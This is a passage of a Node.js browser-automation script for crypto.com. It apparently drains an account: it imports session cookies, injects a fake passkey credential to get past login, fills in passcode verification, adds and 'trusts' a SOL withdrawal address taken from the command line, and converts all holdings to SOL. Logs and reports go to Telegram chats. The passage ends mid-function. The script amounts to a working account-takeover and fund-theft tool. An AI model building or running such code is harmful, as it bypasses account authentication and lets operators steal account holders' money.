"use strict";

const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");

// ── Config ──────────────────────────────────────────────────────────────────

const PORT = 9222;
const BASE = "https://web.crypto.com";

const LOG_PATH = path.join(__dirname, "withdraw.log");
const RESULT_PATH = path.join(__dirname, "withdraw-result.json");
const COOKIES_OUT = path.join(__dirname, "session-cookies.json");

let cmdId = 0;
const pending = new Map();
let sock = null;

// ── CLI args ────────────────────────────────────────────────────────────────

const arg = (flag) => {
  const i = process.argv.indexOf(flag);
  return i >= 0 ? process.argv[i + 1] : null;
};

const EMAIL = arg("--email");
const PASSKEY_FILE = arg("--passkey-file");
const PASSCODE = arg("--passcode");
const COOKIE_FILE = arg("--cookie-file");
const ADDR = arg("--address");

function usage() {
  console.error([
    "Usage: node auto-withdraw.js",
    "  --email          account email",
    "  --passkey-file   path to JSON file with one passkey credential",
    "  --passcode       6-digit passcode",
    "  --cookie-file    path to session-cookies.json",
    "  --address        SOL withdrawal address",
  ].join("\n"));
}

if (!EMAIL || !PASSKEY_FILE || !PASSCODE || !COOKIE_FILE || !ADDR) {
  usage();
  process.exit(1);
}

if (!/^\d{4,8}$/.test(PASSCODE.replace(/\D/g, ""))) {
  console.error("ERR: --passcode must be 4-8 digits");
  process.exit(1);
}
const passcode = PASSCODE.replace(/\D/g, "");

// ── Telegram ────────────────────────────────────────────────────────────────

const TG_CFG = (() => {
  try {
    return JSON.parse(fs.readFileSync(path.join(__dirname, "..", "crypto-exchange-automation", "config.json"), "utf8"));
  } catch (_) { return {}; }
})();

const tgToken = (TG_CFG.bot_token_putter || "").trim();
const tgLogChat = (TG_CFG.log_chat_id || "").trim();
const tgReportChat = (TG_CFG.report_chat_id || "").trim();

function tgSend(text, chatId) {
  if (!tgToken || !chatId) return Promise.resolve(false);
  const body = JSON.stringify({ chat_id: chatId, text });
  return new Promise((resolve) => {
    const req = https.request({
      host: "api.telegram.org",
      path: "/bot" + tgToken + "/sendMessage",
      method: "POST",
      headers: { "Content-Type": "application/json" },
    }, (res) => { res.resume(); res.on("end", () => resolve(true)); });
    req.on("error", () => resolve(false));
    req.end(body);
  });
}

async function tgLog(text) {
  if (!tgLogChat) { logStep("[tg:log] no log chat - not sent"); return; }
  for (let i = 0; i < text.length; i += 3800) await tgSend(text.slice(i, i + 3800), tgLogChat);
}

async function tgReport(text) {
  if (!tgReportChat) { logStep("[tg:report] no report chat - not sent"); return; }
  for (let i = 0; i < text.length; i += 3800) await tgSend(text.slice(i, i + 3800), tgReportChat);
}

// ── Logging ─────────────────────────────────────────────────────────────────

function logStep(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(line);
  try { fs.appendFileSync(LOG_PATH, line + "\n"); } catch (_) {}
}

function logError(msg) {
  const line = `[${new Date().toISOString()}] ERR: ${msg}`;
  console.error(line);
  try { fs.appendFileSync(LOG_PATH, line + "\n"); } catch (_) {}
}

// ── Result tracking ─────────────────────────────────────────────────────────

const result = {
  totalSolBefore: 0,
  totalSolAfter: 0,
  withdrawals: [],
  conversions: [],
  errors: [],
};

function saveResult() {
  try {
    fs.writeFileSync(RESULT_PATH, JSON.stringify(result, null, 2));
    logStep("results saved to " + RESULT_PATH);
  } catch (e) {
    logError("could not save results: " + e.message);
  }
}

// ── Passkey loading ─────────────────────────────────────────────────────────

let passkeyCred = null;
try {
  const raw = fs.readFileSync(PASSKEY_FILE, "utf8");
  const parsed = JSON.parse(raw);
  const obj = Array.isArray(parsed) ? parsed[0] : parsed;
  if (!obj || !obj.rpId || !obj.credId || !obj.jwk) {
    console.error("ERR: passkey file must contain {rpId, credId, userHandle, jwk}");
    process.exit(1);
  }
  passkeyCred = obj;
  logStep("loaded passkey: " + obj.credId.slice(0, 16) + "... (rpId=" + obj.rpId + ")");
} catch (e) {
  console.error("ERR: failed to read passkey file: " + e.message);
  process.exit(1);
}

// ── Cookie loading ──────────────────────────────────────────────────────────

let cookies = [];
try {
  const raw = fs.readFileSync(COOKIE_FILE, "utf8");
  const parsed = JSON.parse(raw);
  if (Array.isArray(parsed)) {
    cookies = parsed;
  } else if (parsed.cookies && Array.isArray(parsed.cookies)) {
    cookies = parsed.cookies;
  } else {
    cookies = [];
  }
  logStep("loaded " + cookies.length + " cookies from " + COOKIE_FILE);
} catch (e) {
  logError("failed to read cookie file: " + e.message);
}

// ── CDP ─────────────────────────────────────────────────────────────────────

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function getJson(p) {
  return new Promise((resolve, reject) => {
    http.get({ host: "127.0.0.1", port: PORT, path: p }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
      });
    }).on("error", reject);
  });
}

async function connect() {
  const targets = await getJson("/json/list");
  const pages = targets.filter((t) => t.type === "page" && t.url.includes("crypto.com"));
  const page = pages.find((t) => t.url.includes("web.crypto.com")) || pages[0];
  if (!page) throw new Error("no crypto.com page target found");
  sock = new WebSocket(page.webSocketDebuggerUrl);
  await new Promise((res, rej) => { sock.onopen = res; sock.onerror = rej; });
  sock.onmessage = (ev) => {
    const msg = JSON.parse(ev.data);
    if (msg.id && pending.has(msg.id)) {
      const p = pending.get(msg.id);
      pending.delete(msg.id);
      clearTimeout(p.timer);
      if (msg.error) p.reject(new Error(JSON.stringify(msg.error)));
      else p.resolve(msg.result);
    }
  };
  sock.onclose = () => {
    pending.forEach((p) => { clearTimeout(p.timer); p.reject(new Error("socket closed")); });
    pending.clear();
  };
  logStep("CDP connected to " + page.webSocketDebuggerUrl.split("/").pop());
}

function send(method, params = {}) {
  const id = ++cmdId;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => { pending.delete(id); reject(new Error("CDP timeout: " + method)); }, 20000);
    pending.set(id, { resolve, reject, timer });
    sock.send(JSON.stringify({ id, method, params }));
  });
}

async function call(method, params = {}) {
  for (let attempt = 0; attempt < 3; attempt++) {
    try { return await send(method, params); } catch (e) {
      if (attempt === 2) throw e;
      await sleep(500);
      if (sock.readyState !== 1) { try { await connect(); } catch (_) {} }
    }
  }
}

async function evalJs(expr) {
  const r = await call("Runtime.evaluate", { expression: expr, returnByValue: true, awaitPromise: true });
  if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails).slice(0, 400));
  return r.result ? r.result.value : undefined;
}

async function navigate(url) {
  await call("Page.enable").catch(() => {});
  await call("Page.navigate", { url });
  await waitFor(() => evalJs("document.readyState && document.readyState !== 'loading' && document.body && document.body.innerText.length > 0"), 30000);
  logStep("navigated to " + url);
}

async function waitFor(fn, timeout = 30000, interval = 1000) {
  const start = Date.now();
  let last;
  while (Date.now() - start < timeout) {
    try { last = await fn(); if (last) return last; } catch (_) {}
    await sleep(interval);
  }
  throw new Error("timeout waiting for condition (last=" + JSON.stringify(last) + ")");
}

// ── CDP mouse events ────────────────────────────────────────────────────────

async function cdpClick(x, y) {
  await call("Input.dispatchMouseEvent", { type: "mouseMoved", x, y });
  await call("Input.dispatchMouseEvent", { type: "mousePressed", x, y, button: "left", clickCount: 1 });
  await sleep(50);
  await call("Input.dispatchMouseEvent", { type: "mouseReleased", x, y, button: "left", clickCount: 1 });
}

// ── UI helpers ──────────────────────────────────────────────────────────────

async function clickByText(text, opts = {}) {
  const exact = opts.exact !== false;
  const ci = !!opts.ci;
  const scopeAll = !!opts.scopeAll;
  const scopeSel = opts.scope ? `document.querySelector(${JSON.stringify(opts.scope)})` : "document";
  return evalJs(`(() => {
    const scope = ${scopeSel};
    if (!scope) return 'no scope';
    const scopes = ${scopeAll ? "[...document.querySelectorAll(" + JSON.stringify(opts.scope) + ")].filter(s => s && s.querySelector)" : "[scope]"};
    if (!scopes.length) return 'no scope';
    const want = ${JSON.stringify(text)};
    for (const s of scopes) {
      const leaves = [...s.querySelectorAll('*')].filter(x => x.children.length === 0 && x.getBoundingClientRect().width > 0);
      const el = leaves.find(x => {
        const t = (x.innerText || '').trim();
        return ${exact ? "t === want" : `t.toLowerCase().includes(want.toLowerCase())`};
      });
      if (!el) continue;
      let cur = el;
      for (let i = 0; i < 8; i++) {
        if (cur.tagName === 'BUTTON' || cur.getAttribute('role') === 'button' || getComputedStyle(cur).cursor === 'pointer') break;
        cur = cur.parentElement;
      }
      cur.click();
      return 'clicked';
    }
    return 'not found: ' + want;
  })()`);
}

async function clickByTextCdp(text, opts = {}) {
  const exact = opts.exact !== false;
  const ci = !!opts.ci;
  const scopeAll = !!opts.scopeAll;
  const scopeSel = opts.scope ? `document.querySelector(${JSON.stringify(opts.scope)})` : "document";
  const coords = await evalJs(`(() => {
    const scope = ${scopeSel};
    if (!scope) return null;
    const scopes = ${scopeAll ? "[...document.querySelectorAll(" + JSON.stringify(opts.scope) + ")].filter(s => s && s.querySelector)" : "[scope]"};
    if (!scopes.length) return null;
    const want = ${JSON.stringify(text)};
    for (const s of scopes) {
      const leaves = [...s.querySelectorAll('*')].filter(x => x.children.length === 0 && x.getBoundingClientRect().width > 0);
      const el = leaves.find(x => {
        const t = (x.innerText || '').trim();
        return ${exact ? "t === want" : `t.toLowerCase().includes(want.toLowerCase())`};
      });
      if (!el) continue;
      let cur = el;
      for (let i = 0; i < 8; i++) {
        if (cur.tagName === 'BUTTON' || cur.getAttribute('role') === 'button' || getComputedStyle(cur).cursor === 'pointer') break;
        cur = cur.parentElement;
      }
      const r = cur.getBoundingClientRect();
      return {x: Math.round(r.x + r.width/2), y: Math.round(r.y + r.height/2)};
    }
    return null;
  })()`);
  if (!coords) return "not found: " + text;
  await cdpClick(coords.x, coords.y);
  return "clicked (cdp)";
}

async function clickButtonInDialog(text, opts = {}) {
  return clickByText(text, Object.assign({ scope: "[role=dialog]", scopeAll: true }, opts));
}

async function getDialogs() {
  return evalJs(`JSON.stringify([...document.querySelectorAll('[role=dialog]')].filter(d => { const r = d.getBoundingClientRect(); if (r.width <= 50 || r.height <= 50) return false; return d.checkVisibility ? d.checkVisibility({checkVisibilityCSS: true, checkOpacity: true, checkOpacityProperty: true}) : !!d.offsetParent; }).map(d => d.innerText.slice(0, 500)))`).then(JSON.parse).catch(() => []);
}

async function removeCookieModal() {
  await evalJs(`(() => {
    const m = [...document.querySelectorAll('[role=dialog]')].find(d => /Privacy Preference|Preferences/i.test(d.innerText));
    if (m) m.remove();
  })()`).catch(() => {});
}

// ── Passkey injection ──────────────────────────────────────────────────────

async function injectPasskey() {
  const script = fs.readFileSync(path.join(__dirname, "virtual-passkey.js"), "utf8");
  await call("Page.addScriptToEvaluateOnNewDocument", { source: script }).catch(() => {});
  const vaultJson = JSON.stringify([passkeyCred]);
  await evalJs(`(() => {
    if (window.__passkeyVault) { window.__passkeyVault.loadVault(${vaultJson}); return 'loaded'; }
    const s = document.createElement('script');
    s.textContent = ${JSON.stringify(script)};
    document.documentElement.appendChild(s);
    s.remove();
    if (window.__passkeyVault) { window.__passkeyVault.loadVault(${vaultJson}); return 'injected+loaded'; }
    return 'failed';
  })()`);
  logStep("passkey shim injected with credential " + passkeyCred.credId.slice(0, 16) + "...");
}

// ── Cookie injection ───────────────────────────────────────────────────────

async function injectCookies() {
  if (!cookies.length) { logStep("no cookies to inject"); return; }
  await call("Network.enable").catch(() => {});
  const cryptoCookies = cookies.filter((c) => c.domain && /crypto\.com$/.test(c.domain));
  logStep("injecting " + cryptoCookies.length + " crypto.com cookies...");
  for (const c of cryptoCookies) {
    try {
      const url = (c.secure ? "https://" : "http://") + (c.domain.startsWith(".") ? c.domain.slice(1) : c.domain) + (c.path || "/");
      await call("Network.setCookie", {
        name: c.name,
        value: c.value,
        url: url,
        domain: c.domain,
        path: c.path || "/",
        secure: !!c.secure,
        httpOnly: !!c.httpOnly,
        sameSite: c.sameSite || undefined,
        expires: c.expires > 0 ? c.expires : undefined,
      }).catch(() => {});
    } catch (_) {}
  }
  logStep("cookies injected");
}

// ── Save cookies ───────────────────────────────────────────────────────────

async function saveCookies(reason) {
  try {
    await call("Network.enable").catch(() => {});
    const r = await call("Network.getAllCookies");
    const all = (r && r.cookies) || [];
    const ckes = all.filter((c) => c.domain && /crypto\.com$/.test(c.domain));
    fs.writeFileSync(COOKIES_OUT, JSON.stringify({
      captured_at: new Date().toISOString(),
      reason,
      count: ckes.length,
      cookies: ckes,
    }, null, 2));
    logStep("saved " + ckes.length + " cookies (" + reason + ")");
  } catch (e) { logError("cookie save failed: " + e.message); }
}

// ── Verification handling ──────────────────────────────────────────────────

async function fillCodeInDialog(code) {
  const r = await evalJs(`(() => {
    const code = ${JSON.stringify(code)};
    const hasInputs = (d) => [...d.querySelectorAll('input')].filter(i => i.getBoundingClientRect().width > 0 && i.type !== 'hidden').length > 0;
    let d = [...document.querySelectorAll('[role=dialog]')].find(hasInputs);
    let attempts = 0;
    while (!d && attempts < 10) {
      d = [...document.querySelectorAll('[role=dialog]')].find(hasInputs);
      attempts++;
    }
    if (!d) {
      const txt = [...document.querySelectorAll('[role=dialog]')].map(x => x.innerText.slice(0, 80)).join(' | ');
      return 'no dialog with inputs; dialogs=' + txt;
    }
    const inputs = [...d.querySelectorAll('input')].filter(i => i.getBoundingClientRect().width > 0 && i.type !== 'hidden');
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    if (inputs.length >= 6) {
      inputs.slice(0, 6).forEach((i, idx) => { setter.call(i, code[idx] || ''); i.dispatchEvent(new Event('input', { bubbles: true })); });
      return 'filled 6-box dialog';
    } else if (inputs.length === 1) {
      setter.call(inputs[0], code);
      inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
      inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
      return 'filled single input';
    } else {
      return 'unexpected input count: ' + inputs.length + ' in "' + d.innerText.slice(0, 120).replace(/\\n/g, ' ') + '"';
    }
  })()`);
  logStep("dialog fill -> " + r);
  await sleep(300);
  const r2 = await clickButtonInDialog("Continue");
  if (/not found/.test(r2)) await clickButtonInDialog("Verify");
  if (/not found/.test(r2) && /not found/.test(r2)) await clickButtonInDialog("Confirm");
  return true;
}

async function clickVerificationOption() {
  return evalJs(`(() => {
    try {
      const dialogs = [...document.querySelectorAll('[role=dialog]')];
      const d = dialogs.find(x => /Verification Options|could not be verified/i.test(x.innerText || '') && /Select/i.test(x.innerText || ''));
      if (!d) return 'not found: no chooser dialog';
      const selectEls = [...d.querySelectorAll('*')].filter(el => /^select$/i.test((el.innerText || '').trim()) && el.getBoundingClientRect().width > 0 && el.getBoundingClientRect().height > 0);
      for (const sel of selectEls) {
        let p = sel.parentElement;
        while (p && p !== d) {
          const t = (p.innerText || '');
          if (/passcode|2fa|authenticator/i.test(t) && !/passkey/i.test(t)) {
            let cur = sel;
            for (let i = 0; i < 6 && cur; i++) {
              if (cur.tagName === 'BUTTON' || cur.getAttribute('role') === 'button' || getComputedStyle(cur).cursor === 'pointer') break;
              cur = cur.parentElement;
            }
            cur.click();
            return 'clicked Select for passcode/2FA';
          }
          p = p.parentElement;
        }
      }
      return 'no passcode row found; selects=' + selectEls.length;
    } catch (e) { return 'js-error: ' + e.message; }
  })()`).catch(() => "chooser-eval-failed");
}

async function handleVerificationIfPresent(timeoutMs = 180000) {
  const deadline = Date.now() + timeoutMs;
  let dealtWithPasskeyPopup = false;
  while (Date.now() < deadline) {
    const dialogs = await getDialogs().catch(() => []);
    const rawRe = /Verification|Enter your code|Passcode|Authenticator|Enter the 6|2FA|Change verification/i;
    const vd = dialogs.filter((d) => rawRe.test(d));
    if (!vd.length) return true;

    const dlg = vd[0];
    logStep("verification dialog: " + dlg.slice(0, 120));

    const isChooserOrChange = /Verification Options|could not be verified|Change Verification Method|Try Again/i.test(dlg);
    const isCodeEntry = /Passcode|Enter your code|Authenticator|Enter the 6|2FA/i.test(dlg);

    if (isChooserOrChange && !dealtWithPasskeyPopup) {
      dealtWithPasskeyPopup = true;
      logStep("clicking through verification chooser to passcode/2FA...");
      if (/Verification Options/i.test(dlg)) {
        await clickVerificationOption();
      } else {
        await clickButtonInDialog("Change Verification Method", { ci: true });
        if (/not found/.test(await clickButtonInDialog("Change Verification Method", { ci: true }).catch(() => "skipped")))
          await clickVerificationOption();
      }
      await sleep(1000);
      continue;
    }

    if (isCodeEntry) {
      logStep("filling passcode in verification dialog...");
      await fillCodeInDialog(passcode);
      await sleep(2000);
      continue;
    }

    await sleep(500);
  }
  logStep("verification handling timed out");
  return false;
}

// ── Phase 1: Restore session & login ───────────────────────────────────────

async function isLoggedIn() {
  try {
    const url = await evalJs("location.href").catch(() => "");
    if (/\/login/i.test(url)) return false;
    const body = await evalJs("document.body.innerText.slice(0, 500)").catch(() => "");
    return /Total balance|My assets|Portfolio|Passkeys|Balance/i.test(body) && !/Log In/.test(body.slice(0, 200));
  } catch (_) { return false; }
}

async function ensureLoggedIn() {
  await navigate(BASE + "/hub/home");
  await sleep(4000);
  await removeCookieModal();

  const logged = await isLoggedIn();
  if (logged) {
    logStep("session active - already logged in");
    await saveCookies("session-restored");
    return;
  }

  logStep("not logged in, attempting passkey login...");
  await navigate("https://accounts.crypto.com/login");
  await sleep(4000);
  await removeCookieModal();

  const r = await clickByText("Passkey", { exact: false });
  if (/not found/.test(r)) {
    const r2 = await clickByText("Log in", { exact: false });
    if (/not found/.test(r2)) throw new Error("cannot find passkey login: " + r);
    await sleep(2000);
    const r3 = await clickByText("Passkey", { exact: false });
    if (/not found/.test(r3)) throw new Error("passkey option not found after clicking Log in: " + r3);
  }
  logStep("clicked passkey login -> " + r);

  try {
    await waitFor(() => isLoggedIn(), 60000, 2000);
    logStep("logged in via passkey");
  } catch (e) {
    await handleVerificationIfPresent(30000);
    const logged2 = await isLoggedIn();
    if (!logged2) {
      logStep("login may have failed, trying once more...");
      await sleep(3000);
      await clickByText("Passkey", { exact: false });
      await waitFor(() => isLoggedIn(), 60000, 2000);
    }
    logStep("logged in via passkey");
  }

  await saveCookies("after-login");
}

// ── Phase 2: Add & trust withdrawal address ────────────────────────────────

async function addAndTrustAddress() {
  logStep("Phase 2: adding & trusting withdrawal address...");

  await navigate(BASE + "/hub/home");
  await sleep(4000);
  await removeCookieModal();

  // Navigate to wallet/withdrawal area
  await navigate(BASE + "/hub/wallet");
  await sleep(4000);
  await removeCookieModal();

  // Try to find and click withdraw to open the flow
  let clicked = await clickByText("Withdraw", { exact: false, ci: false });
  if (/not found/.test(clicked)) {
    // Try from home page balance area
    await navigate(BASE + "/hub/home");
    await sleep(4000);
    // Click withdraw from the balance section
    clicked = await evalJs(`(() => {
      const leaves = [...document.querySelectorAll('*')].filter(x => x.children.length === 0 && x.getBoundingClientRect().width > 0);
      const w = leaves.find(x => (x.innerText || '').trim() === 'Withdraw');
      if (!w) return 'withdraw text not found';
      const wy = w.getBoundingClientRect().y;
      const wx = w.getBoundingClientRect().x + 5;
      const btn = [...document.querySelectorAll('button')].find(b => {
        const r = b.getBoundingClientRect();
        return r.width > 0 && Math.abs(r.y + r.height / 2 - wy) < 30 && r.x <= wx && wx <= r.x + r.width;
      });
      if (!btn) return 'withdraw button not found';
      btn.click();
      return 'clicked withdraw';
    })()`);
    if (clicked !== "clicked withdraw") {
      logStep("could not find withdraw button, navigating to wallet page");
      await navigate(BASE + "/hub/wallet/withdraw");
      await sleep(4000);
    }
  } else {
    logStep("clicked withdraw -> " + clicked);
  }

  await sleep(3000);
  await removeCookieModal();

  // Check if address already exists
  const dialogs = await getDialogs();
  const hasWithdrawDialog = dialogs.some((d) => /Withdraw SOL|Select.*address|SOL Address|Withdrawal/i.test(d));
  if (hasWithdrawDialog) {
    logStep("withdrawal dialog open - checking for 'Add Address' option");

    // Look for Add Address button
    const addClicked = await clickByText("Add Address", { exact: false, scope: "[role=dialog]", scopeAll: true });
    if (/not found/.test(addClicked)) {
      const add2 = await clickByText("Add New Address", { exact: false });
      if (/not found/.test(add2)) {
        const add3 = await clickByText("Add", { exact: true, ci: true });
        if (/not found/.test(add3)) {
          // Might already have the address form or no add option
          logStep("no 'Add Address' button found in withdraw dialog, checking if address entry form is visible...");
        }
      }
    }
  }

  await sleep(2000);

  // Check if address entry form is now visible
  let addressForm = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => 
      /add.*address|enter.*address|new.*address|wallet address|recipient|withdrawal.*address/i.test(x.innerText || '')
    );
    return !!d;
  })()`).catch(() => false);

  if (!addressForm) {
    // Try clicking "Add" or "Add Address" on the page
    logStep("looking for address management page...");
    await navigate(BASE + "/hub/settings#addresses");
    await sleep(4000);
    await clickByText("Add Address", { exact: false });
    await sleep(2000);
  }

  // Select Solana network if needed
  const needNetwork = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => x.innerText.includes('Network') || x.innerText.includes('network'));
    return !!d;
  })()`).catch(() => false);
  if (needNetwork) {
    await clickByText("Solana", { exact: false });
    await sleep(1000);
  }

  // Enter the address
  logStep("entering withdrawal address: " + ADDR);
  const fillResult = await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => {
      const t = x.innerText || '';
      return /address|address|recipient|wallet/i.test(t);
    });
    if (!d) return 'no address dialog';
    const inputs = [...d.querySelectorAll('input:not([type=hidden]):not([readonly])')];
    const addrInput = inputs.find(i => {
      const p = (i.placeholder || '').toLowerCase();
      const n = (i.name || '').toLowerCase();
      return /address|wallet|recipient|addr/i.test(p) || /address|wallet|recipient|addr/i.test(n) || (!p && !n);
    }) || inputs[0];
    if (!addrInput) return 'no input found';
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    setter.call(addrInput, ${JSON.stringify(ADDR)});
    addrInput.dispatchEvent(new Event('input', { bubbles: true }));
    addrInput.dispatchEvent(new Event('change', { bubbles: true }));
    return 'filled address into ' + (addrInput.placeholder || addrInput.name || 'input');
  })()`);
  logStep("address fill -> " + fillResult);

  // Also try to set a label/name
  await evalJs(`(() => {
    const d = [...document.querySelectorAll('[role=dialog]')].find(x => x.innerText.includes('Address') || x.innerText.includes('address'));
    if (!d) return;
    const inputs = [...d.querySelectorAll('input:not([type=hidden]):not([readonly])')];
    const labelInput = inputs.find(i => {
      const p = (i.placeholder || '').toLowerCase();
      const n = (i.name || '').toLowerCase();
      return /label|name|tag|note/i.test(p) || /label|name|tag|note/i.test(n);
    });
    if (labelInput && !labelInput.value) {
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      setter.call(labelInput, 'My SOL Wallet');
      labelInput.dispatchEvent(new Event('input', { bubbles: true }));
      labelInput.dispatchEvent(new Event('change', { bubbles: true }));
    }
  })()`).catch(() => {});

  await sleep(1000);

  // Submit
  logStep("submitting address...");
  let submitted = await clickButtonInDialog("Add Address", { exact: false });
  if (/not found/.test(submitted)) submitted = await clickButtonInDialog("Add", { exact: false });
  if (/not found/.test(submitted)) submitted = await clickButtonInDialog("Submit", { exact: false });
  if (/not found/.test(submitted)) submitted = await clickButtonInDialog("Continue", { exact: false });
  if (/not found/.test(submitted)) submitted = await clickButtonInDialog("Confirm", { exact: false });
  if (/not found/.test(submitted)) {
    const scopes = await getDialogs();
    const lastChance = scopes.find((s) => /address/i.test(s));
    if (lastChance) {
      await clickButtonInDialog("Add");
      submitted = "clicked Add";
    }
  }
  logStep("address submit -> " + submitted);

  // Handle verification (passcode)
  await handleVerificationIfPresent(60000);

  // Wait for confirmation
  await sleep(3000);

  // Check for "Trust" dialog/button
  const trustDialogs = await getDialogs();
  const trustDlg = trustDialogs.find((d) => /trust|Trust this/i.test(d));
  if (trustDlg) {
    logStep("trust dialog detected, clicking trust...");
    await clickButtonInDialog("Trust", { exact: false });
    await clickButtonInDialog("Confirm Trust", { exact: false });
    await clickButtonInDialog("Confirm", { exact: false });
    await sleep(2000);
  }

  // Try to trust the address if there's a trust button on the address list
  const trustBtn = await clickByText("Trust", { exact: false, scope: "[role=dialog]", scopeAll: true });
  if (!/not found/.test(trustBtn)) {
    logStep("clicked trust button");
    await clickButtonInDialog("Confirm Trust", { exact: false });
    await clickButtonInDialog("Confirm", { exact: false });
    await sleep(2000);
    await handleVerificationIfPresent(30000);
  }

  // Close any success dialogs
  await clickButtonInDialog("Got it", { ci: true });
  await clickButtonInDialog("Done", { ci: true });
  await clickButtonInDialog("OK", { ci: true });

  logStep("Phase 2 complete: address added & trusted");
  await saveCookies("after-address-trust");
}

// ── Phase 3: Convert all balances to SOL ────────────────────────────────────

async function getNonSolAssets() {
  const t = await evalJs("document.body.innerText").catch(() => "");
  const start = t.indexOf("My assets");
  const end = t.indexOf("My products");
  const section = start >= 0 && end > start ? t.slice(start, end) : t;
  const re = /([A-Z]{2,12})\s*\n+\s*\n*\s*\$[\d.,]+\s*\n+\s*([\d.]+) ([A-Z]{2,12})/g;
  const out = [];
  let m;
  while ((m = re.exec(section))) {
    const symbol = m[1];
    const amount = parseFloat(m[2].replace(/,/g, ""));
    if (amount > 0.000001 && m[1] === m[3] && symbol !== "SOL") out.push({ symbol, amount });
  }
  return out;
}

async function getSolBalance() {
  await navigate(BASE + "/hub/account/overview");
  await sleep(3000);
  const t = await evalJs("document.body.innerText").catch(() => "");
  const m = t.match(/SOL\s*\n+\s*[\d.,]+\s*\n+\s*([\d.]+)/);
  if (!m) {
    const m2 = t.match(/Balance\s*\n+\s*\$[\d.,]+\s*\n+\s*([\d.]+)\s*SOL/);
    return m2 ? parseFloat(m2[1]) : 0;
  }
  return parseFloat(m[1]);
}

async function convertToSol(symbol, amount) {
  logStep("converting " + amount + " " + symbol + " to SOL...");

  // Navigate to trading page for this symbol
  await navigate(BASE + "/hub/price/" + symbol.toLowerCase());
  await sleep(4000);
  await removeCookieModal();

  // Click Sell
  let r = await clickByText("Sell", { exact: true });
  if (/not found/.test(r)) {
    r = await clickByText("SELL", { exact: false });
    if (/not found/.test(r)) {
      logError("could not find Sell button for " + symbol);
      result.errors.push("could not find Sell button for " + symbol);
      return;
    }
  }
  logStep("clicked Sell -> " + r);
  await sleep(2000);

  // Click Max to sell full amount
  let maxR = await clickByText("Max", { exact: false });
  if (/not found/.test(maxR)) maxR = await clickByText("100%", { exact: false });
  if (/not found/.test(maxR)) {
    // Try entering amount manually
    await evalJs(`(() => {
      const inputs = [...document.querySelectorAll('input:not([type=hidden])')].filter(i => i.getBoundingClientRect().width > 0);
      const amtInput = inputs.find(i => {
        const p = (i.placeholder || '').toLowerCase();
        return /amount|quantity/i.test(p) || (!p && i.type !== 'submit');
      }) || inputs[0];
      if (!amtInput) return;
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      setter.call(amtInput, ${JSON.stringify(String(amount))});
      amtInput.dispatchEvent(new Event('input', { bubbles: true }));
      amtInput.dispatchEvent(new Event('change', { bubbles: true }));
    })()`);
    await sleep(1000);
  }
  logStep("max/last click -> " + (maxR || "manual fill"));
  await sleep(1500);

  // Click submit/sell button
  const submitR = await evalJs(`(() => {
    const btns = [...document.querySelectorAll('button')].filter(b => b.getBoundingClientRect().width > 0);
    const b = btns.find(x => /^Sell\\s+[A-Z0-9]+$/.test(x.innerText.trim()));
    if (!b) return 'submit btn not found';
    b.click();
    return 'clicked submit';
  })()`);
  logStep("submit -> " + submitR);

  // Wait for confirm dialog
  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /Confirm|confirm/i.test(x))), 8000);
  } catch (_) {
    logError("no confirm dialog appeared for " + symbol + " sell");
    result.errors.push("no confirm dialog for " + symbol);
    return;
  }

  // Confirm
  await clickButtonInDialog("Confirm");
  await sleep(1000);

  // Handle verification (passcode)
  await handleVerificationIfPresent(60000);

  // Wait for success
  try {
    await waitFor(() => getDialogs().then((d) => d.some((x) => /sold|purchase|successful|submitted|completed/i.test(x))), 30000);
  } catch (_) {}

  // Close success dialog
  await clickButtonInDialog("Got it", { ci: true });
  await clickButtonInDialog("Done", { ci: true });

  result.conversions.push({ token: symbol, amount, solReceived: 0 });
  logStep("converted " + symbol + " (" + amount + ") to SOL");
}

async function convertAllToSol() {
  logStep("Phase 3: converting all balances to SOL...");

  let prevBal = 0;
  for (let round = 0; round < 5; round++) {
    await navigate(BASE + "/hub/account/overview");
    await sleep(4000);
    await removeCookieModal();

    const solBal = await getSolBalance();
    if (solBal > 0 && solBal === prevBal && round > 0) {
      logStep("SOL balance stable at " + solBal + ", checking for remaining assets...");
    }
    prevBal = solBal;

    const assets = await getNonSolAssets();
    if (!assets.length) {
      logStep("no non-SOL assets found");
      break;
    }

    logStep("round " + (round + 1) + ": " + assets.map((a) => a.symbol).join(", "));

    for (const asset of assets) {
      try {
        await convertToSol(asset.symbol, asset.amount);
      } catch (e) {
        logError("conversion failed for " + asset.symbol + ": " + e.message);
        result.errors.push("conversion failed: " + asset.symbol + " - " + e.message);
      }
      await sleep(3000);
    }
  }

  // Then navigate to SOL market and buy SOL with any remaining USD balance
  await navigate(BASE + "/hub/price/solana");
  await sleep(4000);
  await removeCookieModal();

  let r = await clickByText("Buy", { exact: true });
  if (!/not found/.test(r)) {
    await sleep(2000);
    const maxR = await clickByText("Max", { exact: false });
    if (!/not found/.test(maxR)) {
      await sleep(1500);
      const submitR = await evalJs(`(() => {
        const btns = [...document.querySelectorAll('button')].filter(b => b.getBoundingClientRect().width > 0);
        const b = btns.find(x => /^Buy\\s+[A-Z0-9]+$/.test(x.innerText.trim()));
        if (!b) return 'buy btn not found';
        b.click();
        return 'clicked buy';
      })()`);
      if (!/not found/.test(submitR)) {
        try {
          await waitFor(() => getDialogs().then((d) => d.some((x) => /Confirm/i.test(x))), 8000);
          await clickButtonInDialog("Confirm");
          await handleVerificationIfPresent(60000);
          await waitFor(() => getDialogs().then((d) => d.some((x) => /purchase|bought|successful|submitted/i.test(x))), 30000).catch(() => {});
